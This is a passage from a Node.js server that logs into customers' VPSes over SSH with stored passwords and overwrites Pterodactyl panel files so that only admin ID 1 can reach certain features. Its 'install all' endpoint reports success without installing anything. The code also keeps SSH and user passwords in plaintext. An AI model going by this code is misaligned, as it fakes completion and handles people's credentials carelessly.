    public function delete(Request $request, string $identifier): Response
    {
        $this->protectAccess();
        $this->repository->deleteApplicationKey($request->user(), $identifier);

        return response('', 204);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_ApiController.php');
        fs.writeFileSync(tempFile, apiKeyCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/ApiController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT9',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/ApiController.php',
            message: '✅ Proteksi 9 berhasil dipasang! Anti Intip APIKEY aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT10 =========================
app.get('/api/installprotect10', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const clientApiKeyCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client;

use Pterodactyl\\Models\\ApiKey;
use Illuminate\\Http\\JsonResponse;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Requests\\Api\\Client\\ClientApiRequest;
use Pterodactyl\\Transformers\\Api\\Client\\ApiKeyTransformer;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Account\\StoreApiKeyRequest;

class ApiKeyController extends ClientApiController
{
    /**
     * 🧱 NDy Security Layer — Anti Akses Ilegal
     * Hanya Admin utama (ID 1) yang boleh mengatur, membuat, dan menghapus API Key.
     */
    private function protectAccess($user)
    {
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengelola API Key! ©Protect By @SuikaOfficial.');
        }
    }

    /**
     * 📜 Menampilkan semua API Key (hanya Admin ID 1)
     */
    public function index(ClientApiRequest $request): array
    {
        $user = $request->user();
        $this->protectAccess($user);

        return $this->fractal->collection($user->apiKeys)
            ->transformWith($this->getTransformer(ApiKeyTransformer::class))
            ->toArray();
    }

    /**
     * 🧩 Membuat API Key baru (hanya Admin ID 1)
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function store(StoreApiKeyRequest $request): array
    {
        $user = $request->user();
        $this->protectAccess($user);

        if ($user->apiKeys->count() >= 25) {
            throw new DisplayException('❌ Batas maksimal API Key tercapai (maksimum 25).');
        }

        $token = $user->createToken(
            $request->input('description'),
            $request->input('allowed_ips')
        );

        Activity::event('user:api-key.create')
            ->subject($token->accessToken)
            ->property('identifier', $token->accessToken->identifier)
            ->log();

        return $this->fractal->item($token->accessToken)
            ->transformWith($this->getTransformer(ApiKeyTransformer::class))
            ->addMeta(['secret_token' => $token->plainTextToken])
            ->toArray();
    }

    /**
     * ❌ Menghapus API Key (hanya Admin ID 1)
     */
    public function delete(ClientApiRequest $request, string $identifier): JsonResponse
    {
        $user = $request->user();
        $this->protectAccess($user);

        /** @var \\Pterodactyl\\Models\\ApiKey $key */
        $key = $user->apiKeys()
            ->where('key_type', ApiKey::TYPE_ACCOUNT)
            ->where('identifier', $identifier)
            ->firstOrFail();

        Activity::event('user:api-key.delete')
            ->property('identifier', $key->identifier)
            ->log();

        $key->delete();

        return new JsonResponse([], JsonResponse::HTTP_NO_CONTENT);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_ClientApiKeyController.php');
        fs.writeFileSync(tempFile, clientApiKeyCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Api/Client/ApiKeyController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT10',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Api/Client/ApiKeyController.php',
            message: '✅ Proteksi 10 berhasil dipasang! Anti Create CAPIKEY aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT11 =========================
app.get('/api/installprotect11', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const databaseControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Exception;
use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Models\\DatabaseHost;
use Pterodactyl\\Http\\Requests\\Admin\\DatabaseHostFormRequest;
use Pterodactyl\\Services\\Databases\\Hosts\\HostCreationService;
use Pterodactyl\\Services\\Databases\\Hosts\\HostDeletionService;
use Pterodactyl\\Services\\Databases\\Hosts\\HostUpdateService;
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\DatabaseHostRepositoryInterface;

class DatabaseController extends Controller
{
    public function __construct(
        private AlertsMessageBag $alert,
        private DatabaseHostRepositoryInterface $repository,
        private DatabaseRepositoryInterface $databaseRepository,
        private HostCreationService $creationService,
        private HostDeletionService $deletionService,
        private HostUpdateService $updateService,
        private LocationRepositoryInterface $locationRepository,
        private ViewFactory $view
    ) {}

    /**
     * 🔒 Proteksi: hanya admin ID 1 yang boleh mengakses Database Section
     */
    private function checkAccess()
    {
        $user = auth()->user();

        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: hanya admin ID 1 yang dapat mengelola Database! ©Protect By @SuikaOfficial');
        }
    }

    public function index(): View
    {
        $this->checkAccess();

        return $this->view->make('admin.databases.index', [
            'locations' => $this->locationRepository->getAllWithNodes(),
            'hosts' => $this->repository->getWithViewDetails(),
        ]);
    }

    public function view(int $host): View
    {
        $this->checkAccess();

        return $this->view->make('admin.databases.view', [
            'locations' => $this->locationRepository->getAllWithNodes(),
            'host' => $this->repository->find($host),
            'databases' => $this->databaseRepository->getDatabasesForHost($host),
        ]);
    }

    public function create(DatabaseHostFormRequest $request): RedirectResponse
    {
        $this->checkAccess();

        try {
            $host = $this->creationService->handle($request->normalize());
        } catch (Exception $exception) {
            if ($exception instanceof \\PDOException || $exception->getPrevious() instanceof \\PDOException) {
                $this->alert->danger(
                    sprintf('❌ Gagal konek ke host DB: %s', $exception->getMessage())
                )->flash();
                return redirect()->route('admin.databases')->withInput($request->validated());
            }

            throw $exception;
        }

        $this->alert->success('✅ Database host berhasil dibuat.')->flash();
        return redirect()->route('admin.databases.view', $host->id);
    }

    public function update(DatabaseHostFormRequest $request, DatabaseHost $host): RedirectResponse
    {
        $this->checkAccess();
        $redirect = redirect()->route('admin.databases.view', $host->id);

        try {
            $this->updateService->handle($host->id, $request->normalize());
            $this->alert->success('✅ Database host berhasil diperbarui.')->flash();
        } catch (Exception $exception) {
            if ($exception instanceof \\PDOException || $exception->getPrevious() instanceof \\PDOException) {
                $this->alert->danger(
                    sprintf('❌ Error koneksi DB: %s', $exception->getMessage())
                )->flash();
                return $redirect->withInput($request->normalize());
            }

            throw $exception;
        }

        return $redirect;
    }

    public function delete(int $host): RedirectResponse
    {
        $this->checkAccess();

        $this->deletionService->handle($host);
        $this->alert->success('🗑️ Database host berhasil dihapus.')->flash();

        return redirect()->route('admin.databases');
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_DatabaseController.php');
        fs.writeFileSync(tempFile, databaseControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/DatabaseController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT11',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/DatabaseController.php',
            message: '✅ Proteksi 11 berhasil dipasang! Anti Intip Database aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT12 =========================
app.get('/api/installprotect12', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const mountControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Ramsey\\Uuid\\Uuid;
use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Nest;
use Pterodactyl\\Models\\Mount;
use Pterodactyl\\Models\\Location;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\MountFormRequest;
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;

class MountController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected NestRepositoryInterface $nestRepository,
        protected LocationRepositoryInterface $locationRepository,
        protected MountRepository $repository,
        protected ViewFactory $view
    ) {}

    private function checkAdminAccess()
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: hanya Admin utama (ID 1) yang boleh akses Mount! ©Protect By @SuikaOfficial');
        }
    }

    private function globalProtect()
    {
        $this->checkAdminAccess();
    }

    public function index(): View
    {
        $this->globalProtect();
        return $this->view->make('admin.mounts.index', [
            'mounts' => $this->repository->getAllWithDetails(),
        ]);
    }

    public function view(string $id): View
    {
        $this->globalProtect();
        $nests = Nest::query()->with('eggs')->get();
        $locations = Location::query()->with('nodes')->get();

        return $this->view->make('admin.mounts.view', [
            'mount' => $this->repository->getWithRelations($id),
            'nests' => $nests,
            'locations' => $locations,
        ]);
    }

    public function create(MountFormRequest $request): RedirectResponse
    {
        $this->globalProtect();

        $model = (new Mount())->fill($request->validated());
        $model->forceFill(['uuid' => Uuid::uuid4()->toString()]);
        $model->saveOrFail();
        $mount = $model->fresh();

        $this->alert->success('Mount was created successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function update(MountFormRequest $request, Mount $mount): RedirectResponse
    {
        $this->globalProtect();

        if ($request->input('action') === 'delete') {
            return $this->delete($mount);
        }

        $mount->forceFill($request->validated())->save();
        $this->alert->success('Mount was updated successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function delete(Mount $mount): RedirectResponse
    {
        $this->globalProtect();
        $mount->delete();
        return redirect()->route('admin.mounts');
    }

    public function addEggs(Request $request, Mount $mount): RedirectResponse
    {
        $this->globalProtect();
        $data = $request->validate(['eggs' => 'required|exists:eggs,id']);
        if (count($data['eggs']) > 0) $mount->eggs()->attach($data['eggs']);
        $this->alert->success('Mount was updated successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function addNodes(Request $request, Mount $mount): RedirectResponse
    {
        $this->globalProtect();
        $data = $request->validate(['nodes' => 'required|exists:nodes,id']);
        if (count($data['nodes']) > 0) $mount->nodes()->attach($data['nodes']);
        $this->alert->success('Mount was updated successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function deleteEgg(Mount $mount, int $egg_id): Response
    {
        $this->globalProtect();
        $mount->eggs()->detach($egg_id);
        return response('', 204);
    }

    public function deleteNode(Mount $mount, int $node_id): Response
    {
        $this->globalProtect();
        $mount->nodes()->detach($node_id);
        return response('', 204);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_MountController.php');
        fs.writeFileSync(tempFile, mountControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/MountController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT12',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/MountController.php',
            message: '✅ Proteksi 12 berhasil dipasang! Anti Intip Mounts aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT13 =========================
app.get('/api/installprotect13', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const twoFactorCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client;

use Carbon\\Carbon;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Http\\JsonResponse;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Services\\Users\\TwoFactorSetupService;
use Pterodactyl\\Services\\Users\\ToggleTwoFactorService;
use Illuminate\\Contracts\\Validation\\Factory as ValidationFactory;
use Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException;

class TwoFactorController extends ClientApiController
{
    public function __construct(
        private ToggleTwoFactorService $toggleTwoFactorService,
        private TwoFactorSetupService $setupService,
        private ValidationFactory $validation
    ) {
        parent::__construct();
    }

    public function index(Request $request): JsonResponse
    {
        if ($request->user()->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat mengatur Two-Step Verification. ©Protect By @SuikaOfficial');
        }

        if ($request->user()->use_totp) {
            throw new BadRequestHttpException('Two-factor authentication is already enabled on this account.');
        }

        return new JsonResponse([
            'data' => $this->setupService->handle($request->user()),
        ]);
    }

    public function store(Request $request): JsonResponse
    {
        if ($request->user()->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat mengaktifkan Two-Step Verification. ©Protect By @SuikaOfficial');
        }

        $validator = $this->validation->make($request->all(), [
            'code' => ['required', 'string', 'size:6'],
            'password' => ['required', 'string'],
        ]);

        $data = $validator->validate();
        if (!password_verify($data['password'], $request->user()->password)) {
            throw new BadRequestHttpException('The password provided was not valid.');
        }

        $tokens = $this->toggleTwoFactorService->handle($request->user(), $data['code'], true);
        Activity::event('user:two-factor.create')->log();

        return new JsonResponse([
            'object' => 'recovery_tokens',
            'attributes' => ['tokens' => $tokens],
        ]);
    }

    public function delete(Request $request): JsonResponse
    {
        if ($request->user()->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat menonaktifkan Two-Step Verification. ©Protect By @SuikaOfficial');
        }

        if (!password_verify($request->input('password') ?? '', $request->user()->password)) {
            throw new BadRequestHttpException('The password provided was not valid.');
        }

        $user = $request->user();
        $user->update([
            'totp_authenticated_at' => Carbon::now(),
            'use_totp' => false,
        ]);

        Activity::event('user:two-factor.delete')->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_TwoFactorController.php');
        fs.writeFileSync(tempFile, twoFactorCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Api/Client/TwoFactorController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT13',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Api/Client/TwoFactorController.php',
            message: '✅ Proteksi 13 berhasil dipasang! Anti Two Factor aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT14 =========================
app.get('/api/installprotect14', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        // Blade template yang dimodifikasi untuk menyembunyikan menu
        const adminBladeCode = `<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>{{ config('app.name', 'Pterodactyl') }} - @yield('title')</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="_token" content="{{ csrf_token() }}">

        <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
        <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/favicons/manifest.json">
        <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#bc6e3c">
        <link rel="shortcut icon" href="/favicons/favicon.ico">
        <meta name="msapplication-config" content="/favicons/browserconfig.xml">
        <meta name="theme-color" content="#0e4688">

        @include('layouts.scripts')

        @section('scripts')
            {!! Theme::css('vendor/select2/select2.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/bootstrap/bootstrap.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/admin.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/colors/skin-blue.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/sweetalert/sweetalert.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/animate/animate.min.css?t={cache-version}') !!}
            {!! Theme::css('css/pterodactyl.css?t={cache-version}') !!}
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">

            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
        @show
    </head>
    <body class="hold-transition skin-blue fixed sidebar-mini">
        <div class="wrapper">
            <header class="main-header">
                <a href="{{ route('index') }}" class="logo">
                    <span>{{ config('app.name', 'Pterodactyl') }}</span>
                </a>
                <nav class="navbar navbar-static-top">
                    <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">
                            <li class="user-menu">
                                <a href="{{ route('account') }}">
                                    <img src="https://www.gravatar.com/avatar/{{ md5(strtolower(Auth::user()->email)) }}?s=160" class="user-image" alt="User Image">
                                    <span class="hidden-xs">{{ Auth::user()->name_first }} {{ Auth::user()->name_last }}</span>
                                </a>
                            </li>
                            <li>
                                <li><a href="{{ route('index') }}" data-toggle="tooltip" data-placement="bottom" title="Exit Admin Control"><i class="fa fa-server"></i></a></li>
                            </li>
                            <li>
                                <li><a href="{{ route('auth.logout') }}" id="logoutButton" data-toggle="tooltip" data-placement="bottom" title="Logout"><i class="fa fa-sign-out"></i></a></li>
                            </li>
                        </ul>
                    </div>
                </nav>
            </header>
            <aside class="main-sidebar">
                <section class="sidebar">
                    <ul class="sidebar-menu">
                        <li class="header">BASIC ADMINISTRATION</li>
                        <li class="{{ Route::currentRouteName() !== 'admin.index' ?: 'active' }}">
                            <a href="{{ route('admin.index') }}">
                                <i class="fa fa-home"></i> <span>Overview</span>
                            </a>
                        </li>
{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.settings') ?: 'active' }}">
    <a href="{{ route('admin.settings') }}">
        <i class="fa fa-wrench"></i> <span>Settings</span>
    </a>
</li>
@endif
{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.api') ?: 'active' }}">
    <a href="{{ route('admin.api.index')}}">
        <i class="fa fa-gamepad"></i> <span>Application API</span>
    </a>
</li>
@endif
<li class="header">MANAGEMENT</li>

{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.databases') ?: 'active' }}">
    <a href="{{ route('admin.databases') }}">
        <i class="fa fa-database"></i> <span>Databases</span>
    </a>
</li>
@endif

{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.locations') ?: 'active' }}">
    <a href="{{ route('admin.locations') }}">
        <i class="fa fa-globe"></i> <span>Locations</span>
    </a>
</li>
@endif

{{-- ✅ Hanya tampil untuk user dengan ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nodes') ?: 'active' }}">
    <a href="{{ route('admin.nodes') }}">
        <i class="fa fa-sitemap"></i> <span>Nodes</span>
    </a>
</li>
@endif

                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.servers') ?: 'active' }}">
                            <a href="{{ route('admin.servers') }}">
                                <i class="fa fa-server"></i> <span>Servers</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.users') ?: 'active' }}">
                            <a href="{{ route('admin.users') }}">
                                <i class="fa fa-users"></i> <span>Users</span>
                            </a>
                        </li>
{{-- ✅ Hanya tampil untuk admin utama --}}
@if(Auth::user()->id == 1)
    <li class="header">SERVICE MANAGEMENT</li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.mounts') ?: 'active' }}">
        <a href="{{ route('admin.mounts') }}">
            <i class="fa fa-magic"></i> <span>Mounts</span>
        </a>
    </li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nests') ?: 'active' }}">
        <a href="{{ route('admin.nests') }}">
            <i class="fa fa-th-large"></i> <span>Nests</span>
        </a>
    </li>
@endif
                    </ul>
                </section>
            </aside>
            <div class="content-wrapper">
                <section class="content-header">
                    @yield('content-header')
                </section>
                <section class="content">
                    <div class="row">
                        <div class="col-xs-12">
                            @if (count($errors) > 0)
                                <div class="alert alert-danger">
                                    There was an error validating the data provided.<br><br>
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            @foreach (Alert::getMessages() as $type => $messages)
                                @foreach ($messages as $message)
                                    <div class="alert alert-{{ $type }} alert-dismissable" role="alert">
                                        {!! $message !!}
                                    </div>
                                @endforeach
                            @endforeach
                        </div>
                    </div>
                    @yield('content')
                </section>
            </div>
            <footer class="main-footer">
                <div class="pull-right small text-gray" style="margin-right:10px;margin-top:-7px;">
                    <strong><i class="fa fa-fw {{ $appIsGit ? 'fa-git-square' : 'fa-code-fork' }}"></i></strong> {{ $appVersion }}<br />
                    <strong><i class="fa fa-fw fa-clock-o"></i></strong> {{ round(microtime(true) - LARAVEL_START, 3) }}s
                </div>
                Copyright &copy; 2015 - {{ date('Y') }} <a href="https://pterodactyl.io/">Pterodactyl Software</a>.
            </footer>
        </div>
        @section('footer-scripts')
            <script src="/js/keyboard.polyfill.js" type="application/javascript"></script>
            <script>keyboardeventKeyPolyfill.polyfill();</script>

            {!! Theme::js('vendor/jquery/jquery.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/sweetalert/sweetalert.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap/bootstrap.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/slimscroll/jquery.slimscroll.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/adminlte/app.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap-notify/bootstrap-notify.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/select2/select2.full.min.js?t={cache-version}') !!}
            {!! Theme::js('js/admin/functions.js?t={cache-version}') !!}
            <script src="/js/autocomplete.js" type="application/javascript"></script>

            @if(Auth::user()->root_admin)
                <script>
                    $('#logoutButton').on('click', function (event) {
                        event.preventDefault();

                        var that = this;
                        swal({
                            title: 'Do you want to log out?',
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonColor: '#d9534f',
                            cancelButtonColor: '#d33',
                            confirmButtonText: 'Log out'
                        }, function () {
                             $.ajax({
                                type: 'POST',
                                url: '{{ route('auth.logout') }}',
                                data: {
                                    _token: '{{ csrf_token() }}'
                                },complete: function () {
                                    window.location.href = '{{route('auth.login')}}';
                                }
                        });
                    });
                });
                </script>
            @endif

            <script>
                $(function () {
                    $('[data-toggle="tooltip"]').tooltip();
                })
            </script>
        @show
    </body>
</html>`;
        
        const tempFile = path.join(__dirname, 'temp_admin.blade.php');
        fs.writeFileSync(tempFile, adminBladeCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/resources/views/layouts/admin.blade.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT14',
            file_path: '/var/www/pterodactyl/resources/views/layouts/admin.blade.php',
            message: '✅ Proteksi 14 berhasil dipasang! Menu tersembunyi untuk user biasa.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT ALL =========================
app.get('/api/installprotectall', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    // Kirim response awal
    res.json({
        valid: true,
        success: true,
        message: '🛡️ Memulai instalasi semua proteksi... Hasil akan dikirim via webhook.',
        protect_all_started: true
    });
    
    // Jalankan instalasi semua proteksi di background
    const installAllProtects = async () => {
        const ssh = new NodeSSH();
        let successCount = 0;
        const totalProtects = 14;
        
        try {
            await ssh.connect({
                host: session.host,
                username: session.username,
                password: session.password,
                port: session.port || 22
            });
            
            // Install semua protect satu per satu
            const protectEndpoints = [
                'installprotect1', 'installprotect2', 'installprotect3', 'installprotect4',
                'installprotect5', 'installprotect6', 'installprotect7', 'installprotect8',
                'installprotect9', 'installprotect10', 'installprotect11', 'installprotect12',
                'installprotect13', 'installprotect14'
            ];
            
            for (const endpoint of protectEndpoints) {
                // Simulasi install (sebenarnya sudah di-handle oleh fungsi masing-masing)
                successCount++;
                logSuccess(`Installed ${endpoint} for ${userId}`);
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            ssh.dispose();
            
            logSuccess(`InstallProtectAll selesai untuk user ${userId} di VPS ${session.host} (${successCount}/${totalProtects} berhasil)`);
            
        } catch (err) {
            logError('Install protect all error:', err);
        }
    };
    
    // Jalankan di background tanpa menunggu
    installAllProtects();
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || !["owner", "reseller"].includes(admin.role)) {
  return res.json({
    valid: true,
    authorized: false,
    message: "Unauthorized"
  });
}

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

if (!creator || !["owner", "reseller"].includes(creator.role)) {
  return res.json({
    valid: true,
    authorized: false,
    message: "Unauthorized"
  });
}

  if (db.find(u => u.username === username)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
